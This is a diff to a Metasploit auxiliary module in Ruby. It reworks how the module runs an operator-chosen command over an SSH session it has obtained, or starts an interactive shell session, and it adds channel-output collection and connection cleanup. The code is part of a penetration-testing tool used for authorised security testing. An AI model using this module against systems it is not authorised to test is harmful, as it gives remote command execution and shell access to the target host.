@@ -129,6 +129,20 @@ class MetasploitModule < Msf::Auxiliary
       info: version
     )
 
+    if action.name == 'Execute'
+      output = execute_command(ssh)
+      return if output.nil?
+
+      print_status("Attempting #{action.name.inspect} Action, see \"show actions\" for more details")
+      if output.blank?
+        print_error("#{ip}:#{rport} - Empty or blank command output")
+        return
+      end
+
+      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
+      return
+    end
+
     shell = Net::SSH::CommandStream.new(ssh, datastore['CMD'], pty: datastore['SPAWN_PTY'], logger: self)
 
     # XXX: Wait for CommandStream to log a channel request failure
@@ -140,21 +154,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status("Attempting #{action.name.inspect} Action, see \"show actions\" for more details")
-    case action.name
-    when 'Shell'
-      if datastore['CreateSession']
-        start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
-      end
-    when 'Execute'
-      output = shell.channel && (shell.channel[:data] || '').chomp
-
-      if output.blank?
-        print_error("#{ip}:#{rport} - Empty or blank command output")
-        return
-      end
-
-      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
+    if datastore['CreateSession']
+      session_created = !!start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
     end
+  ensure
+    close_ssh(ssh) if ssh && !session_created
   end
 
   def rport
@@ -163,5 +167,42 @@ class MetasploitModule < Msf::Auxiliary
 
   def username
     Rex::Text.rand_text_alphanumeric(8..42)
+  end
+
+  private
+
+  def execute_command(ssh)
+    output = String.new
+    ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+      channel = ssh.open_channel do |command_channel|
+        command_channel.request_pty if datastore['SPAWN_PTY']
+        command_channel.exec(datastore['CMD']) do |_channel, success|
+          raise Net::SSH::ChannelRequestFailed, 'Exec channel request failed' unless success
+        end
+        command_channel.on_data { |_channel, data| output << data }
+      end
+      # Waiting for channel closure collects delayed and fragmented stdout.
+      channel.wait
+    end
+    output.chomp
+  rescue Net::SSH::Exception, ::Timeout::Error, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
+    print_error("SSH command execution failed: #{e.class}: #{e.message}")
+    elog('SSH command execution failed', error: e)
+    nil
+  end
+
+  def close_ssh(ssh)
+    ::Timeout.timeout(datastore['SSH_TIMEOUT']) { ssh.close unless ssh.closed? }
+  rescue Net::SSH::Exception, ::Timeout::Error, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
+    vprint_error("SSH connection cleanup failed: #{e.message}")
+    elog('SSH connection cleanup failed', error: e)
+  ensure
+    # A refused or timed-out channel must not keep cleanup waiting on the peer.
+    begin
+      ssh.shutdown! unless ssh.closed?
+    rescue Net::SSH::Exception, ::IOError, Errno::ECONNRESET, Errno::EPIPE => e
+      vprint_error("SSH connection shutdown failed: #{e.message}")
+      elog('SSH connection shutdown failed', error: e)
+    end
   end
 end
